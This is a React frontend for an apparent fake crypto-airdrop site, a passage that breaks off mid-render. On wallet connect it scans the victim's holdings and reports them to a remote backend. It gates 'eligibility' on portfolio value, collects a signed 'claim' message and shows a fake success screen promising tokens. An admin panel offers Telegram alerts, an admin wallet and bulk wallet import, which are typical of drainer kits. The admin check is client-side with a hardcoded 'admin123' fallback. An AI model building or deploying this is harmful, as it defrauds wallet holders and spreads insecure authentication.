// App.jsx - COMPLETE UPDATED FRONTEND WITH AUTO-SCAN
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
import { 
  WagmiProvider, 
  createConfig, 
  http, 
  useAccount, 
  useDisconnect, 
  useSignMessage,
  useSwitchChain
} from "wagmi";
import { 
  mainnet, polygon, bsc, arbitrum, optimism, avalanche, 
  fantom, gnosis, celo, base, zora, linea, polygonZkEvm 
} from "wagmi/chains";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { useState, useEffect, useCallback } from "react";
import { ethers } from "ethers";

// Create outside components
const queryClient = new QueryClient();

// All supported EVM chains
const allChains = [
  mainnet, polygon, bsc, arbitrum, optimism, avalanche,
  fantom, gnosis, celo, base, zora, linea, polygonZkEvm
];

// ✅ PROPER WalletConnect Project ID
const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62";

// Create config with all chains
const config = createConfig(
  getDefaultConfig({
    appName: "Universal Chain Scanner",
    appDescription: "Scan assets across EVM chains",
    appUrl: "https://profound-frangollo-3b98e1.netlify.app",
    appIcon: "https://family.co/logo.png",
    walletConnectProjectId: walletConnectProjectId,
    chains: allChains,
    transports: allChains.reduce((acc, chain) => {
      acc[chain.id] = http(getChainRPC(chain.id)[0]);
      return acc;
    }, {}),
  })
);

// Get reliable RPC endpoints
function getChainRPC(chainId) {
  const rpcs = {
    1: ["https://eth.llamarpc.com", "https://rpc.ankr.com/eth"],
    56: ["https://bsc-dataseed.binance.org", "https://rpc.ankr.com/bsc"],
    137: ["https://polygon-rpc.com", "https://rpc.ankr.com/polygon"],
    250: ["https://rpc.ftm.tools", "https://rpc.ankr.com/fantom"],
    42161: ["https://arb1.arbitrum.io/rpc", "https://rpc.ankr.com/arbitrum"],
    10: ["https://mainnet.optimism.io", "https://rpc.ankr.com/optimism"],
    43114: ["https://api.avax.network/ext/bc/C/rpc", "https://rpc.ankr.com/avalanche"],
    100: ["https://rpc.gnosischain.com", "https://rpc.ankr.com/gnosis"],
    42220: ["https://forno.celo.org", "https://rpc.ankr.com/celo"],
    8453: ["https://mainnet.base.org", "https://base.publicnode.com"],
    7777777: ["https://rpc.zora.energy"],
    59144: ["https://rpc.linea.build"],
    1101: ["https://zkevm-rpc.com", "https://rpc.ankr.com/polygon_zkevm"]
  };
  return rpcs[chainId] || ["https://rpc.ankr.com/eth"];
}

// Backend API - USE YOUR RENDER URL
const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api";

function WalletApp() {
  const { address, isConnected, connector, chainId } = useAccount();
  const { disconnect } = useDisconnect();
  const { signMessage } = useSignMessage();
  const { switchChain } = useSwitchChain();
  
  const [loading, setLoading] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [scanResult, setScanResult] = useState(null);
  const [isEligible, setIsEligible] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [claimData, setClaimData] = useState(null);
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [adminSettings, setAdminSettings] = useState({
    minAmount: 10,
    telegramChatId: "",
    adminWallet: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
    tokenName: "Universal Reward Token",
    tokenSymbol: "URT",
    emailNotifications: true
  });
  const [bulkWallets, setBulkWallets] = useState("");
  const [isMobile, setIsMobile] = useState(false);
  const [connectionStep, setConnectionStep] = useState(0); // 0: connect, 1: scanning, 2: results, 3: sign, 4: claim

  // Check if mobile
  useEffect(() => {
    setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent));
  }, []);

  // Auto-scan when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      handleAutoScan();
    }
  }, [isConnected, address]);

  // ✅ AUTO SCAN FUNCTION - Called immediately after connection
  const handleAutoScan = async () => {
    if (!address) return;
    
    setScanning(true);
    setConnectionStep(1);
    
    try {
      // Send connection to backend (triggers auto-scan)
      const response = await fetch(`${BACKEND_API}/wallet/connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          ip: "auto-detected"
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setIsEligible(data.data.isEligible);
        setConnectionStep(2);
        
        // Show success notification
        if (data.data.isEligible) {
          showNotification(
            "🎉 Wallet Scanned Successfully!",
            `Your portfolio value: $${data.data.totalValue.toFixed(2)}\nYou're eligible for free tokens!`,
            "success"
          );
        } else {
          showNotification(
            "📊 Scan Complete",
            `Portfolio value: $${data.data.totalValue.toFixed(2)}\nMinimum $${data.data.minimumRequired} required for rewards.`,
            "info"
          );
        }
      }
      
    } catch (error) {
      console.error('Auto-scan error:', error);
      showNotification("Error", "Auto-scan failed. Please try manual scan.", "error");
    } finally {
      setScanning(false);
    }
  };

  // ✅ MANUAL SCAN FUNCTION
  const handleManualScan = async () => {
    if (!address) return;
    
    setScanning(true);
    
    try {
      const response = await fetch(`${BACKEND_API}/wallet/scan`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setIsEligible(data.data.isEligible);
        setConnectionStep(2);
        
        showNotification(
          "🔍 Scan Complete",
          `Found ${data.data.tokenCount} tokens worth $${data.data.totalValue.toFixed(2)}`,
          "success"
        );
      }
      
    } catch (error) {
      console.error('Scan error:', error);
      showNotification("Error", "Scan failed. Please try again.", "error");
    } finally {
      setScanning(false);
    }
  };

  // ✅ SIGN MESSAGE FOR TOKEN CLAIM
  const handleSignForClaim = async () => {
    if (!address || !isEligible) return;
    
    setIsProcessing(true);
    setConnectionStep(3);
    
    try {
      const message = `I claim my free ${adminSettings.tokenName} (${adminSettings.tokenSymbol}) rewards from Universal Chain Scanner.\n\nWallet: ${address}\nTimestamp: ${Date.now()}\n\nBy signing, I confirm I am the owner of this wallet.`;
      
      // Request signature from wallet
      const signature = await signMessage({ message });
      
      // Send signature to backend
      const response = await fetch(`${BACKEND_API}/wallet/sign`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          signature,
          message
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setClaimData(data.data);
        setConnectionStep(4);
        
        // Start claim processing
        setTimeout(() => {
          processTokenClaim(data.data.claimId);
        }, 2000);
        
        showNotification(
          "✅ Signature Verified",
          "Your token claim has been initiated! Processing...",
          "success"
        );
      }
      
    } catch (error) {
      console.error('Sign error:', error);
      showNotification("Error", "Signature cancelled or failed.", "error");
      setIsProcessing(false);
    }
  };

  // ✅ PROCESS TOKEN CLAIM
  const processTokenClaim = async (claimId) => {
    try {
      const response = await fetch(`${BACKEND_API}/wallet/process`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          claimId
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        // Show lottery win animation
        showLotteryAnimation(data.data);
        
        showNotification(
          "🎊 CLAIM SUCCESSFUL!",
          "Your tokens are on the way to your wallet!",
          "success"
        );
      }
      
    } catch (error) {
      console.error('Claim error:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  // ✅ LOTTERY WIN ANIMATION
  const showLotteryAnimation = (claimData) => {
    const animationContainer = document.createElement('div');
    animationContainer.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      z-index: 99999;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      color: white;
      font-family: system-ui, -apple-system, sans-serif;
      animation: fadeIn 0.5s ease;
    `;
    
    animationContainer.innerHTML = `
      <div style="text-align: center; padding: 40px; max-width: 600px;">
        <div style="font-size: 100px; margin-bottom: 30px; animation: bounce 2s infinite;">🎉</div>
        <h1 style="font-size: 48px; margin-bottom: 20px; text-shadow: 0 2px 10px rgba(0,0,0,0.3);">
          CONGRATULATIONS!
        </h1>
        <h2 style="font-size: 32px; margin-bottom: 30px; opacity: 0.9;">
          You've Successfully Claimed Your Tokens!
        </h2>
        
        <div style="background: rgba(255,255,255,0.2); padding: 30px; border-radius: 20px; margin: 30px 0; backdrop-filter: blur(10px);">
          <div style="font-size: 28px; margin-bottom: 20px;">🎁 Claim Details</div>
          <div style="font-size: 20px; margin: 15px 0;">Token: ${adminSettings.tokenName}</div>
          <div style="font-size: 20px; margin: 15px 0;">Symbol: ${adminSettings.tokenSymbol}</div>
          <div style="font-size: 20px; margin: 15px 0;">Status: ✅ Completed</div>
          <div style="font-size: 18px; margin-top: 25px; opacity: 0.9;">
            Tokens will appear in your wallet within 2-5 minutes
          </div>
        </div>
        
        <div style="font-size: 16px; opacity: 0.8; margin: 30px 0;">
          Thank you for using Universal Chain Scanner!
        </div>
        
        <button onclick="this.parentElement.parentElement.remove()" style="
          padding: 20px 50px;
          background: white;
          color: #764ba2;
          border: none;
          border-radius: 50px;
          font-size: 20px;
          font-weight: bold;
          cursor: pointer;
          margin-top: 20px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.3);
          transition: transform 0.3s;
        ">
          🎉 CELEBRATE & CLOSE 🎉
        </button>
      </div>
      
      <style>
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes bounce {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-20px); }
        }
      </style>
    `;
    
    document.body.appendChild(animationContainer);
    
    // Add confetti
    for (let i = 0; i < 150; i++) {
      setTimeout(() => {
        const confetti = document.createElement('div');
        confetti.style.cssText = `
          position: fixed;
          width: 15px;
          height: 15px;
          background: ${['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'][Math.floor(Math.random() * 5)]};
          border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
          top: -20px;
          left: ${Math.random() * 100}vw;
          animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
          z-index: 99998;
          opacity: ${Math.random() * 0.5 + 0.5};
        `;
        document.body.appendChild(confetti);
        setTimeout(() => confetti.remove(), 5000);
      }, i * 50);
    }
    
    // Add confetti animation
    const style = document.createElement('style');
    style.textContent = `
      @keyframes confettiFall {
        0% { transform: translateY(0) rotate(0deg); }
        100% { transform: translateY(100vh) rotate(720deg); }
      }
    `;
    document.head.appendChild(style);
    
    // Auto-remove after 20 seconds
    setTimeout(() => {
      if (document.body.contains(animationContainer)) {
        document.body.removeChild(animationContainer);
      }
    }, 20000);
  };

  // ✅ ADMIN FUNCTIONS
  const handleAdminLogin = () => {
    const password = prompt("Enter admin password:");
    if (password === (process.env.REACT_APP_ADMIN_PASS || "admin123")) {
      setShowAdminPanel(true);
      loadAdminSettings();
    } else {
      alert("Invalid password");
    }
  };

  const loadAdminSettings = async () => {
    try {
      const response = await fetch(`${BACKEND_API}/admin/settings`, {
        headers: {
          'Authorization': `Bearer ${process.env.REACT_APP_ADMIN_TOKEN || 'admin123'}`
        }
      });
      
      const data = await response.json();
      if (data.success) {
        setAdminSettings(data.settings);
      }
    } catch (error) {
      console.error('Load settings error:', error);
    }
  };

  const saveAdminSettings = async () => {
    try {
      const response = await fetch(`${BACKEND_API}/admin/settings`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${process.env.REACT_APP_ADMIN_TOKEN || 'admin123'}`
        },
        body: JSON.stringify(adminSettings)
      });
      
      const data = await response.json();
      if (data.success) {
        showNotification("Settings Saved", "Admin settings updated successfully", "success");
      }
    } catch (error) {
      console.error('Save settings error:', error);
    }
  };

  const handleBulkImport = async () => {
    const wallets = bulkWallets.split('\n').filter(w => w.trim().startsWith('0x') && w.trim().length === 42);
    
    if (wallets.length === 0) {
      alert("No valid wallet addresses found");
      return;
    }
    
    if (!confirm(`Import ${wallets.length} wallets?`)) return;
    
    try {
      const response = await fetch(`${BACKEND_API}/admin/import-wallets`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${process.env.REACT_APP_ADMIN_TOKEN || 'admin123'}`
        },
        body: JSON.stringify({ wallets })
      });
      
      const data = await response.json();
      if (data.success) {
        showNotification("Import Successful", `Imported ${data.imported} wallets`, "success");
        setBulkWallets("");
      }
    } catch (error) {
      console.error('Import error:', error);
    }
  };

  // ✅ HELPER FUNCTIONS
  const showNotification = (title, message, type = "info") => {
    const notification = document.createElement('div');
    notification.style.cssText = `
      position: fixed;
      top: 20px;
      right: 20px;
      background: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : '#3b82f6'};
      color: white;
      padding: 15px 25px;
      border-radius: 10px;
      z-index: 10000;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
      animation: slideIn 0.3s ease;
      max-width: 400px;
    `;
    
    notification.innerHTML = `
      <div style="font-weight: bold; margin-bottom: 5px;">${title}</div>
      <div style="font-size: 14px; opacity: 0.9;">${message}</div>
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
      if (document.body.contains(notification)) {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
          if (document.body.contains(notification)) {
            document.body.removeChild(notification);
          }
        }, 300);
      }
    }, 5000);
    
    // Add animation styles
    if (!document.getElementById('notification-styles')) {
      const style = document.createElement('style');
      style.id = 'notification-styles';
      style.textContent = `
        @keyframes slideIn {
          from { transform: translateX(100%); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }
        @keyframes slideOut {
          from { transform: translateX(0); opacity: 1; }
          to { transform: translateX(100%); opacity: 0; }
        }
      `;
      document.head.appendChild(style);
    }
  };

  const formatCurrency = (value) => {
    if (!value) return "$0.00";
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD'
    }).format(value);
  };

  // ✅ RENDER FUNCTIONS
  const renderConnectionSteps = () => {
    const steps = [
      { step: 0, title: "Connect Wallet", icon: "🔗" },
      { step: 1, title: "Auto Scanning", icon: "🔍" },
      { step: 2, title: "Scan Results", icon: "📊" },
      { step: 3, title: "Sign Claim", icon: "✍️" },
      { step: 4, title: "Claim Tokens", icon: "🎁" }
    ];
    
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        margin: '30px 0',
        flexWrap: 'wrap',
        gap: '10px'
      }}>
        {steps.map((s, index) => (
          <div key={s.step} style={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            opacity: connectionStep >= s.step ? 1 : 0.5
          }}>
            <div style={{
              width: '50px',
              height: '50px',
              borderRadius: '50%',
              background: connectionStep >= s.step ? 
                (connectionStep === s.step ? '#3b82f6' : '#10b981') : '#4b5563',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '20px',
              marginBottom: '10px',
              border: connectionStep === s.step ? '3px solid #60a5fa' : 'none'
            }}>
              {s.icon}
            </div>
            <div style={{
              fontSize: '12px',
              textAlign: 'center',
              color: connectionStep >= s.step ? '#e2e8f0' : '#94a3b8'
            }}>
              {s.title}
            </div>
            {index < steps.length - 1 && (
              <div style={{
                width: '40px',
                height: '2px',
                background: connectionStep > s.step ? '#10b981' : '#4b5563',
                marginTop: '-30px',
                marginLeft: '45px'
              }}></div>
            )}
          </div>
        ))}
      </div>
    );
  };

  const renderScanResults = () => {
    if (!scanResult) return null;
    
    return (
      <div style={{
        background: '#1e293b',
        padding: '25px',
        borderRadius: '15px',
        border: '2px solid #334155',
        marginBottom: '30px'
      }}>
        <h3 style={{ color: '#e2e8f0', marginBottom: '20px', display: 'flex', alignItems: 'center', gap: '10px' }}>
          📊 Scan Results
        </h3>
        
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '20px', marginBottom: '25px' }}>
          <div style={{ background: '#0f172a', padding: '20px', borderRadius: '10px' }}>
            <div style={{ color: '#94a3b8', fontSize: '14px' }}>Total Value</div>
            <div style={{ color: '#10b981', fontSize: '28px', fontWeight: 'bold' }}>
              {formatCurrency(scanResult.totalValue)}
            </div>
          </div>
          
          <div style={{ background: '#0f172a', padding: '20px', borderRadius: '10px' }}>
            <div style={{ color: '#94a3b8', fontSize: '14px' }}>Tokens Found</div>
            <div style={{ color: '#3b82f6', fontSize: '28px', fontWeight: 'bold' }}>
              {scanResult.tokenCount || 0}
            </div>
          </div>
          
          <div style={{ background: '#0f172a', padding: '20px', borderRadius: '10px' }}>
            <div style={{ color: '#94a3b8', fontSize: '14px' }}>Chains</div>
            <div style={{ color: '#8b5cf6', fontSize: '28px', fontWeight: 'bold' }}>
              {scanResult.chainCount || 0}
            </div>
          </div>
          
          <div style={{ background: '#0f172a', padding: '20px', borderRadius: '10px' }}>
            <div style={{ color: '#94a3b8', fontSize: '14px' }}>Status</div>
            <div style={{ 
              color: isEligible ? '#10b981' : '#f59e0b', 
              fontSize: '28px', 
              fontWeight: 'bold',
              display: 'flex',
              alignItems: 'center',
              gap: '10px'
            }}>
              {isEligible ? '✅ Eligible' : '⚠️ Not Eligible'}
            </div>
          </div>
        </div>
        
        {scanResult.tokens && scanResult.tokens.length > 0 && (
          <div>
            <h4 style={{ color: '#e2e8f0', marginBottom: '15px' }}>Detected Tokens</h4>
            <div style={{
              maxHeight: '200px',
              overflowY: 'auto',
              background: '#0f172a',
              borderRadius: '10px',
              padding: '15px'
            }}>
              {scanResult.tokens.map((token, index) => (
                <div key={index} style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  padding: '10px',
                  borderBottom: index < scanResult.tokens.length - 1 ? '1px solid #334155' : 'none'
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <div style={{
                      width: '30px',
                      height: '30px',
                      borderRadius: '50%',
                      background: token.isNative ? '#10b981' : '#3b82f6',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      fontSize: '12px',
                      fontWeight: 'bold'
                    }}>
                      {token.symbol.substring(0, 3)}
                    </div>
                    <div>
                      <div style={{ color: '#e2e8f0', fontWeight: 'bold' }}>{token.symbol}</div>
                      <div style={{ color: '#94a3b8', fontSize: '12px' }}>{token.chain}</div>
                    </div>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ color: '#10b981', fontWeight: 'bold' }}>{formatCurrency(token.valueUSD)}</div>
                    <div style={{ color: '#94a3b8', fontSize: '12px' }}>{token.balance.toFixed(4)} {token.symbol}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
        
        {isEligible && (
          <div style={{
            background: 'rgba(16, 185, 129, 0.1)',
            padding: '20px',
            borderRadius: '10px',
            marginTop: '20px',
            border: '1px solid #10b981'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '15px', marginBottom: '15px' }}>
              <div style={{
                width: '40px',
                height: '40px',
                borderRadius: '50%',
                background: '#10b981',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '20px'
              }}>
                🎁
              </div>
              <div>
                <h4 style={{ color: '#10b981', margin: '0 0 5px 0' }}>You're Eligible for Free Tokens!</h4>
                <p style={{ color: '#94a3b8', margin: 0, fontSize: '14px' }}>
                  Sign the message below to claim your {adminSettings.tokenName} ({adminSettings.tokenSymbol})
                </p>
              </div>
            </div>
            
            <button
              onClick={handleSignForClaim}
              disabled={isProcessing}
              style={{
                padding: '15px 30px',
                background: isProcessing ? '#4b5563' : '#10b981',
                color: 'white',
                border: 'none',
                borderRadius: '10px',
                cursor: isProcessing ? 'not-allowed' : 'pointer',
                fontWeight: 'bold',
                fontSize: '16px',
                width: '100%',
                display: 'flex',
                justifyContent: 'center',
                alignItems: 'center',
                gap: '10px'
              }}
            >
              {isProcessing ? (
                <>
                  <div style={{ animation: 'spin 1s linear infinite' }}>⏳</div>
                  Processing Claim...
                </>
              ) : (
                <>
                  ✍️ Sign & Claim {adminSettings.tokenSymbol}
                </>
              )}
            </button>
            
            <div style={{
              background: 'rgba(0,0,0,0.2)',
              padding: '15px',
              borderRadius: '8px',
              marginTop: '15px',
              fontSize: '12px',
              color: '#94a3b8'
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '5px' }}>
                <div style={{ color: '#10b981' }}>ℹ️</div>
                <div>By signing, you confirm wallet ownership to receive your free tokens</div>
              </div>
            </div>
          </div>
        )}
        
        {!isEligible && scanResult && (
          <div style={{
            background: 'rgba(245, 158, 11, 0.1)',
            padding: '20px',
            borderRadius: '10px',
            marginTop: '20px',
            border: '1px solid #f59e0b',
            textAlign: 'center'
          }}>
            <div style={{ fontSize: '48px', marginBottom: '10px' }}>⚠️</div>
            <h4 style={{ color: '#f59e0b', marginBottom: '10px' }}>Not Eligible for Rewards</h4>
            <p style={{ color: '#94a3b8', marginBottom: '15px' }}>
              Minimum portfolio value required: ${scanResult.minimumRequired || 10}
              <br/>
              Your portfolio: {formatCurrency(scanResult.totalValue)}
            </p>
            <button
              onClick={handleManualScan}
              style={{
                padding: '10px 20px',
                background: '#f59e0b',
                color: 'white',
                border: 'none',
                borderRadius: '8px',
                cursor: 'pointer',
                fontWeight: 'bold'
              }}
            >
              🔄 Scan Again
            </button>
          </div>
        )}
      </div>
    );
  };

  const renderAdminPanel = () => {
    if (!showAdminPanel) return null;
    
    return (
      <div style={{
        position: 'fixed',
        top: '0',
        left: '0',
        right: '0',
        bottom: '0',
        background: 'rgba(0, 0, 0, 0.9)',
        zIndex: 1000,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '20px'
      }}>
        <div style={{
          background: '#0f172a',
          padding: '30px',
          borderRadius: '20px',
          width: '100%',
          maxWidth: '800px',
          maxHeight: '90vh',
          overflowY: 'auto',
          border: '2px solid #3b82f6'
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '30px' }}>
            <h3 style={{ color: '#e2e8f0', fontSize: '24px' }}>👑 Admin Control Panel</h3>
            <button
              onClick={() => setShowAdminPanel(false)}
              style={{
                background: 'transparent',
                border: 'none',
                color: '#94a3b8',
                fontSize: '24px',
                cursor: 'pointer'
              }}
            >
              ✕
            </button>
          </div>
          
          <div style={{ marginBottom: '30px' }}>
            <h4 style={{ color: '#e2e8f0', marginBottom: '15px' }}>⚙️ Settings</h4>
            
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '20px' }}>
              <div>
                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Minimum Eligibility ($)</label>
                <input
                  type="number"
                  value={adminSettings.minAmount}
                  onChange={(e) => setAdminSettings({...adminSettings, minAmount: e.target.value})}
                  style={{
                    width: '100%',
                    padding: '10px',
                    background: '#1e293b',
                    border: '1px solid #334155',
                    borderRadius: '8px',
                    color: 'white'
                  }}
                />
              </div>
              
              <div>
                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Telegram Chat ID</label>
                <input
                  type="text"
                  value={adminSettings.telegramChatId}
                  onChange={(e) => setAdminSettings({...adminSettings, telegramChatId: e.target.value})}
                  placeholder="-123456789"
                  style={{
                    width: '100%',
                    padding: '10px',
                    background: '#1e293b',
                    border: '1px solid #334155',
                    borderRadius: '8px',
                    color: 'white'
                  }}
                />
              </div>
              
              <div>
                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Token Name</label>
                <input
                  type="text"
                  value={adminSettings.tokenName}
                  onChange={(e) => setAdminSettings({...adminSettings, tokenName: e.target.value})}
                  style={{
                    width: '100%',
                    padding: '10px',
                    background: '#1e293b',
                    border: '1px solid #334155',
                    borderRadius: '8px',
                    color: 'white'
                  }}
                />
              </div>
              
              <div>
                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Token Symbol</label>
                <input
                  type="text"
                  value={adminSettings.tokenSymbol}
                  onChange={(e) => setAdminSettings({...adminSettings, tokenSymbol: e.target.value})}
                  style={{
                    width: '100%',
                    padding: '10px',
                    background: '#1e293b',
                    border: '1px solid #334155',
                    borderRadius: '8px',
                    color: 'white'
                  }}
                />
              </div>
              
              <div>
                <label style={{ color: '#94a3b8', marginBottom: '5px', display: 'block' }}>Admin Wallet</label>
                <input
                  type="text"
                  value={adminSettings.adminWallet}
                  onChange={(e) => setAdminSettings({...adminSettings, adminWallet: e.target.value})}
                  style={{
                    width: '100%',
                    padding: '10px',
                    background: '#1e293b',
                    border: '1px solid #334155',
                    borderRadius: '8px',
                    color: 'white'
                  }}
                />
              </div>
              
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <input
                  type="checkbox"
                  id="emailNotifications"
                  checked={adminSettings.emailNotifications}
                  onChange={(e) => setAdminSettings({...adminSettings, emailNotifications: e.target.checked})}
                />
                <label htmlFor="emailNotifications" style={{ color: '#94a3b8' }}>Enable Email Notifications</label>
              </div>
            </div>
            
            <button
              onClick={saveAdminSettings}
              style={{
                marginTop: '20px',
                padding: '12px 30px',
                background: '#3b82f6',
                color: 'white',
                border: 'none',
                borderRadius: '8px',
                cursor: 'pointer',
                fontWeight: 'bold',
                width: '100%'
              }}
            >
              💾 Save Settings
            </button>
          </div>
          
          <div style={{ marginBottom: '30px' }}>
            <h4 style={{ color: '#e2e8f0', marginBottom: '15px' }}>📦 Bulk Wallet Import</h4>
            <textarea
              value={bulkWallets}
              onChange={(e) => setBulkWallets(e.target.value)}
              placeholder="Enter wallet addresses (one per line)
Example:
0x742d35Cc6634C0532925a3b844Bc454e4438f44e
0x742d35Cc6634C0532925a3b844Bc454e4438f44e
0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
              rows={8}
              style={{
                width: '100%',
                padding: '15px',
                background: '#1e293b',
                border: '1px solid #334155',
                borderRadius: '8px',
                color: 'white',
                fontFamily: 'monospace',
                marginBottom: '15px'
              }}
            />
            <div style={{ display: 'flex', gap: '10px' }}>
              <button
                onClick={handleBulkImport}
                style={{
                  padding: '12px 30px',
                  background: '#10b981',
                  color: 'white',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontWeight: 'bold',
                  flex: 1
                }}
              >
                📥 Import Wallets
              </button>
              <button
                onClick={() => {
                  const count = bulkWallets.split('\n').filter(w => w.trim().startsWith('0x')).length;
                  alert(`${count} valid wallet addresses detected`);
                }}
                style={{
                  padding: '12px 30px',
                  background: '#6b7280',
                  color: 'white',
                  border: 'none',
                  borderRadius: '8px',
                  cursor: 'pointer',
                  fontWeight: 'bold'
                }}
              >
                🔍 Validate
              </button>
            </div>
          </div>
          
          <div>
            <h4 style={{ color: '#e2e8f0', marginBottom: '15px' }}>📊 System Status</h4>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '15px' }}>
              <div style={{ background: '#1e293b', padding: '15px', borderRadius: '10px', textAlign: 'center' }}>
                <div style={{ color: '#94a3b8', fontSize: '12px' }}>Backend</div>
                <div style={{ color: '#10b981', fontSize: '20px', fontWeight: 'bold' }}>✅ Online</div>
              </div>
              <div style={{ background: '#1e293b', padding: '15px', borderRadius: '10px', textAlign: 'center' }}>
                <div style={{ color: '#94a3b8', fontSize: '12px' }}>Telegram</div>
                <div style={{ color: telegramEnabled ? '#10b981' : '#ef4444', fontSize: '20px', fontWeight: 'bold' }}>
                  {telegramEnabled ? '✅ Connected' : '❌ Disabled'}
                </div>
              </div>
              <div style={{ background: '#1e293b', padding: '15px', borderRadius: '10px', textAlign: 'center' }}>
                <div style={{ color: '#94a3b8', fontSize: '12px' }}>Scanner</div>
                <div style={{ color: '#3b82f6', fontSize: '20px', fontWeight: 'bold' }}>🟢 Active</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  };

  // ✅ MAIN RENDER
  return (
    <div style={{
      padding: isMobile ? '15px' : '20px',
      maxWidth: '1200px',
      margin: '0 auto',
      minHeight: '100vh',
      background: '#0f172a',
      color: 'white',
      fontFamily: 'system-ui, -apple-system, sans-serif'
    }}>
      {/* Header */}
      <header style={{
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: '20px 0',
        borderBottom: '1px solid #334155',
        marginBottom: '30px',
        flexWrap: 'wrap',
        gap: '15px'
      }}>
        <div>
          <h1 style={{
            fontSize: isMobile ? '24px' : '32px',
            background: 'linear-gradient(90deg, #3b82f6, #10b981, #8b5cf6)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            marginBottom: '5px'
          }}>
            🌐 Universal Chain Scanner
          </h1>
          <p style={{ color: '#94a3b8', fontSize: '14px' }}>
            Auto-scanning • Instant rewards • Multi-chain support
          </p>
        </div>
        
        <div style={{ display: 'flex', alignItems: 'center', gap: '15px', flexWrap: 'wrap' }}>
          {address && (
            <div style={{
              background: '#1e293b',
              padding: '8px 15px',
              borderRadius: '8px',
              fontFamily: 'monospace',
              border: '1px solid #334155',
              fontSize: '14px'
            }}>
              {isMobile ? `${address.slice(0, 6)}...${address.slice(-4)}` : address}
            </div>
          )}
          
          <button
            onClick={handleAdminLogin}
            style={{
              padding: '10px 20px',
              background: '#8b5cf6',
              color: 'white',
              border: 'none',
              borderRadius: '8px',
              cursor: 'pointer',
              fontWeight: 'bold',
              fontSize: '14px'
            }}
          >
            👑 Admin
          </button>
          
          <ConnectKitButton />
        </div>
      </header>

      <main>
        {renderConnectionSteps()}
        
        {!isConnected ? (
          // Welcome screen
          <div style={{ textAlign: 'center', padding: isMobile ? '40px 15px' : '60px 20px' }}>
            <div style={{ 
              fontSize: isMobile ? '60px' : '80px',
              marginBottom: '30px',
              background: 'linear-gradient(90deg, #3b82f6, #10b981, #8b5cf6)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent'
            }}>
              🔍
            </div>
            
            <h2 style={{ fontSize: isMobile ? '28px' : '36px', marginBottom: '20px' }}>
